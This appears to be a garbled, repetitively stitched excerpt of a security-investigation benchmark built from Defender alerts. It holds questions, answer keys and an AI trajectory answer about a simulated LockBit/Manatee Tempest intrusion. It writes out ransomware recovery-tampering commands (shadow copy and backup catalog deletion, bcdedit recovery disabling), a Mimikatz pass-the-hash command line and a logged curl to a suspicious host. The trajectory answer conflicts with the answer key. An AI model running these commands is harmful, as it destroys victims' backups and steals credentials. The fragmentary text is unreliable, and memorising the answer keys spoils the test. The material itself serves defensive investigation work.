•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures & bcdedit /set default recoveryenabled no]', 'MDATP', 'Microsoft', '7d47542a-7c5a-4fd4-85f2-640f2bf0927b_1', '37ed1840-2428-9ace-8db4-fc7ceeda30b9', '', '', 'WindowsDefenderAtp', '', '', 'False', '2024-06-20 09:10:49.054537+00:00', '2024-06-20 09:10:51.876113+00:00', '2024-06-20 09:19:23.179872+00:00', '["1. question.context: A security incident involving suspected tampering with system recovery settings using various commands and processes, including `vssblatemp.exe` to delete all volume shadow copies, was observed on device `vnevado-win11t` (AAD Device ID: `e5799261-6720-4297-961e-bd9ca4275033`). During the incident, the process `vssblatemp.exe` was executed with command: `vssblatemp.exe delete shadows /all`. This is part of an adversarial attempt to prevent the recovery of corrupted systems by deleting built-in operating system data or turning off recovery services. The incident was detected on 2024-07-04. This tampering could deny access to available backups and recovery options, augmenting the effects of data destruction or data encryption.

solution: There was system recovery setting tampering by the Azure AD user with AadUserId `731adb71-b11c-4bbf-850b-57989b350e96`.
There was a possible attempt to access the Primary Refresh Token (PRT) involving the process `browsercore.exe`.

question.context: A Mimikatz credential theft tool was detected on a device. Mimikatz is a credential theft tool that can harvest plaintext passwords, password hashes, smartcard PINs, and Kerberos tickets. Attackers may use this tool to harvest credentials to log into this or other devices on the network by impersonating a valid user. The detection of Mimikatz is part of a broader security investigation. Additionally, there was later evidence of lateral movement to the jump server `Vnevado-jump` using PSExec.
question.question: A related alert indicated a possible compromised user account dropping ransomware-related files. Can you identify the name of the specific file associated with the ransomware activity?
solution: The Mimikatz credential theft tool was detected on the device with AadDeviceId `4d8d23e9-a77d-4e33-9435-b8c457e57ca1`.
Lateral movement to the jump server occurred using PSExec to IP address `99.83.111.100`.
A compromised user account was observed dropping a ransomware-related file named `get-userprttoken.ps1` on several devices.

Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

question.context: A security incident involving suspicious 'GenRansom' behavior was detected on the host `vnevado-win11t` with AadDeviceId `e5799261-6720-4297-961e-bd9ca4275033`. Malware activity was found, necessitating precautionary measures. Additionally, there was an alert about system recovery setting tampering, where adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system.
question.question: During this incident, what specific command line was observed that could indicate system recovery setting tampering on the device?
solution: There was suspicious 'GenRansom' behavior detected on the device with AadDeviceId `e5799261-6720-4297-961e-bd9ca4275033`.
Lateral movement using SMB remote file access was blocked for the user with SID `S-1-5-21-1840191660-8534830288-125585561-1522`.
System recovery setting tampering was observed with the process having ProcessId `4312`, created at `2024-06-20t09:10:48.0676225z`, and the command line `bcdedit /set recoveryenabled no`.

question.context: A recent incident occurred where all file snapshots and shadow copies were deleted via WMI or VSSAdmin on the host `vnevado-win11u` using the file `vssblatemp.exe`. This is a common action performed during a ransomware infection. Additionally, in relation to this incident, there is a historical context that the Manatee Tempest group, a Russia-based cybercriminal group known for its Dridex banking trojan campaigns, was involved. They have been active since June 2014 and use sophisticated methods such as drive-by download attacks and the BLISTER loader to deliver Cobalt Strike beacons.
question.question: What is the IP address associated with the malicious Manatee Tempest activity?
solution: File backups were deleted via WMI or VSSAdmin by a user with SID `S-1-5-21-1840191660-8534830288-125585561-1522`, which is a common tactic during a ransomware infection.
A suspicious IP address `198.43.121.209` was associated with the Manatee Tempest activity group, known for malicious activities such as malware campaigns and ransomware deployment.

Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]

question.context: A serious security incident involving the Mimikatz credential theft tool was detected on a device. Mimikatz is known for harvesting plaintext passwords, password hashes, smartcard PINs, and Kerberos tickets. An attacker might use this tool to obtain credentials to log into this or other devices on the network by impersonating a valid user. The tool was executed with several different command lines indicating privilege escalation and credential theft attempts.
question.question: What was the command line of the process detected with the known credential theft tool execution?
solution: The attacker launched `mimikatz.exe` with the command line `privilege::debug sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:..\notepad.exe \vnevado-jump cmd.exe` at `2024-06-20t09:05:15.5627318z`, with Process ID `6600`.
A malicious credential theft tool execution was detected with the command line `conhost.exe 0xffffffff -forcev1` at `2024-06-20t08:59:42.8455252z`, with Process ID `7948`.

tampering', 'System recovery setting tampering', 'High', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:

question.context: A security incident involving the Manatee Tempest activity group was detected. This group is known for using drive-by downloads and other methods to gain initial access, followed by using malware tools for lateral movement. The incident started with a suspicious activity involving a URL `http://vectorsandarrows.com`, accessed from host `vnevado-win10r` with IP address `198.43.121.209` via a curl command. The ProcessId__CreatedTimeUtc__CommandLine is `1332__2024-06-20t09:10:52.7298237z__curl http://vectorsandarrows.com`.
question.question: What is the host name of the device where 'CommandAndControl' malware was detected during lateral movement?
solution: Manatee Tempest, a Russia-based cybercriminal group, was involved in the use of access broker Mustard Tempest to facilitate infections and lateral movement using BLISTER loader and Cobalt Strike beacons on various networks. The group used domain fronting for command-and-control of Cobalt Strike.
A suspicious account with SID `S-1-5-21-1840191660-8534830288-125585561-1522` was identified in the context of the Manatee Tempest group activities.
The 'CommandAndControl' malware was detected on the host `vnevado-win10s`, indicating an attempt at lateral movement within the network.

An IP address associated with this is `99.83.111.100`, and files such as `get-userprttoken.ps1`, `characterical.zip`, and `characterical.zip.lockbit` were detected. Additionally, there was an incident of system recovery setting tampering. The tampering might involve adversaries deleting or removing system data and turning off recovery features to prevent system restoration.
question.question: Can you identify the process command used that might have tampered with the system recovery settings?
solution: The device with AadDeviceId `e5799261-6720-4297-961e-bd9ca4275033` is potentially compromised and exhibiting ransomware-like behavior.

On 2024-06-20 at 09:29:40.8785892 UTC, the process vssblatemp.exe with Process ID `1900` was executed with the command line `vssblatemp.exe delete shadows /all` to tamper with system recovery settings by deleting volume shadow copies.

trajectory.action:
The process command used to tamper with the system recovery settings is:

**bcdedit /set recoveryenabled no**

This command disables the Windows recovery feature, preventing the system from automatically recovering from boot failures. This command was executed on multiple compromised devices including vnevado-win11t (where characterical.zip.lockbit was found) at 2024-06-20 09:29:38.

Additionally, a secondary recovery tampering command was also used:

**bcdedit /set bootstatuspolicy ignoreallfailures**

This command configures the system to ignore all boot failures and prevents the display of the Windows Error Recovery screen, further hindering recovery attempts.

Both commands were executed via WMI (wmiprvse.exe) as part of a LockBit ransomware attack originating from IP address 99.83.111.100. These commands are typical ransomware techniques used to prevent victims from restoring their systems through built-in Windows recovery features.

has been detected. A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, Windows Server 2016 and later versions, iOS, and Android devices. It is a JSON Web Token (JWT) that's specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

For more information, read the Activity profile: Midnight Blizzard credential attacks Threat Analytics report: https://security.microsoft.com/threatanalytics3/e4aad043-a273-4f88-b65e-fdfc3996ec92/analystreport?

It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

tampering', 'System recovery setting tampering', 'High', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]

A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, Windows Server 2016 and later versions, iOS, and Android devices. It is a JSON Web Token (JWT) that's specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

This event was associated with the process `browsercore.exe` running on the host `vnevado-win11t` with the AadDeviceId `e5799261-6720-4297-961e-bd9ca4275033`. PRTs enable Single Sign-On (SSO) and, if compromised, can allow an attacker to move laterally or perform credential theft.

question.context: A security incident related to the Manatee Tempest activity group was also identified. Manatee Tempest is known for using various methods such as drive-by download, including malvertising and FakeUpdates (SocGholish) infections, to obtain initial access, and they frequently use BLISTER loader to deliver Cobalt Strike beacons for lateral movement and ransomware deployment. The group also employs domain fronting for command-and-control channels.

question.context: A security incident related to the Manatee Tempest activity group has been detected. This actor, tracked by Microsoft and known to be a Russia-based cybercriminal group, has been active since June 2014 and is notorious for its Dridex banking trojan campaigns. The group partners with Mustard Tempest to facilitate access to target networks via methods such as drive-by downloads, malvertising, and FakeUpdates infections. They use a BLISTER loader to deploy Cobalt Strike beacons for lateral movement and ransomware deployment. Recently, on host identified by `vnevado-win10s` with the AadDeviceId `f5b847aa-8712-4bf6-b4f7-ed6cd89e1505`, a process with ProcessId `6460` was initiated to execute a command to curl a suspicious URL (`http://vectorsandarrows.com`).

Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

question.context: A suspicious WMI process creation was observed on the machine. Malware frequently uses WMI to spawn new processes, breaking process trees and further infecting a machine. This activity occurred at 2024-07-04 22:35:03.378778+00:00. During the same incident, there was a possible attempt to access Primary Refresh Token (PRT) detected. A PRT is a key artifact of Azure AD authentication and is a JSON Web Token (JWT) issued to enable single sign-on (SSO) across applications used on devices such as Windows 10 and later versions, iOS, and Android. Attackers might attempt to access this token to move laterally or perform credential theft.

question.context: A ransomware payload was remotely launched on a device from the IP address `99.83.111.100`. Attackers might be attempting to encrypt content on this device, rendering it unusable to users. This alert links to suspicious hands-on keyboard user behavior observed on the same device. Suspicious and anomalous user behavior might indicate that a user has been compromised. The end alert indicates that unusual activities, such as changes to the frequency and usage pattern of tools or applications, or the user performing a series of unusual activities, were noticed.

[('File backups were deleted', 'All file snapshots and shadow copies have been deleted via WMI or VSSAdmin which is common during Ransomware infection.

For more information, read the Activity Profile: Iranian MOIS operators opportunistically deploy limited-impact wiper in response to Israel-Hamas war Threat Analytics report: https://security.microsoft.com/threatanalytics3/c6674205-df28-453a-9e42-0010b7979bdd/overview?tid4b2462a4-bbee-495a-a0e1-f23ae524cc9c', 'bae8c1e0-0441-dd0f-2466-2b2efbe5dc13', 'vnevado-win10s.vnevado.alpineskihouse.co'), ('System recovery setting tampering', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures & bcdedit /set default recoveryenabled no]', '65e0e94f-36d8-f3a7-039e-c1770857c3ce', 'vnevado-win10s.vnevado.alpineskihouse.co'), ("'CommandAndControl' malware was detected during lateral movement", "'CommandAndControl' malware was detected on this device. An attacker might be attempting to move laterally to this device from another device on the network.", '6b033b86-3938-d3b6-cd72-34a3509dcb85', 'vnevado-win10s.vnevado.alpineskihouse.co'), ('Command and Control behavior was blocked', 'Malware and unwanted software are undesirable applications that perform annoying, disruptive, or harmful actions on affected machines. Some of these undesirable applications can replicate and spread from one machine to another. Others are able to receive commands from remote attackers and perform activities associated with cyber attacks.

A malware is considered active if it is found running on the machine or it already has persistence mechanisms in place. Active malware detections are assigned higher severity ratings.

Because this malware was active, take precautionary measures and check for residual signs of infection.', '8d6872d7-0a01-d28d-10f3-f73c8875ff9f', 'vnevado-win10s.vnevado.alpineskihouse.co'), ('Possible attempt to access Primary Refresh Token (PRT)', "Possible attempt to access Primary Refresh Token (PRT) has been detected. A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, Windows Server 2016 and later versions, iOS, and Android devices. It is a JSON Web Token (JWT) that's specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

For more information, read the Activity profile: Midnight Blizzard credential attacks Threat Analytics report: https://security.microsoft.com/threatanalytics3/e4aad043-a273-4f88-b65e-fdfc3996ec92/analystreport?

It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

question.context: A security incident involving ransomware-like behavior impacting several devices has been observed. Initial detection included the use of PsExec to launch a command on a remote device, suggesting lateral movement using this tool. This was followed by suspicious activities leading to compromised assets exhibiting ransomware-like behavior. The attacker might be using the specified user account, IP, or device to infect multiple devices with ransomware. Automated remediation actions were considered to address the threat.
question.question: What is the name of the file that is associated with the ransomware-like behavior?
solution: An attacker used the account `tgs2z` to launch a command on a remote device via PsExec.
There was a lateral movement to the jump server with IP address `99.83.111.100` using PsExec.
A file named `ponceau.7z` is associated with ransomware-like behavior, indicating potentially compromised assets.

Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

•	Rebuild the affected machine.

Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]

This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.
